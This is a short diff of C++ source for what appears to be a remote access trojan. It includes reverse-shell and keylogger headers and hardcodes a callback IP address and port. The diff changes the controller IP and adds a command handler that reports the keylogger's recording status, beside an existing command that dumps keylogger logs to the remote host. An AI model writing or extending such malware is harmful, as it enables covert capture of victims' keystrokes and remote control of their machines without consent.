@@ -14,7 +14,7 @@
 #include "reverse_shell/ReverseShell.h"
 #include "Keylogger/KeyLogger.h"
 
-#define IP "192.168.1.133"
+#define IP "192.168.82.182"
 
 #define PORT 3055
 
@@ -184,6 +184,11 @@ int main() {
                         case 14: {
                             std::cout << "DUMP KEYLOGGER LOGS" << std::endl;
                             keyLogger.sendKeyLoggerLogs();
+                            break;
+                        }
+                        case 15:{
+                            std::cout << "GET INFORMATION " << std::endl;
+                            stream.sendString(keyLogger.isRecordingKeys() ? "true":"false");
                             break;
                         }
                         case 16: {
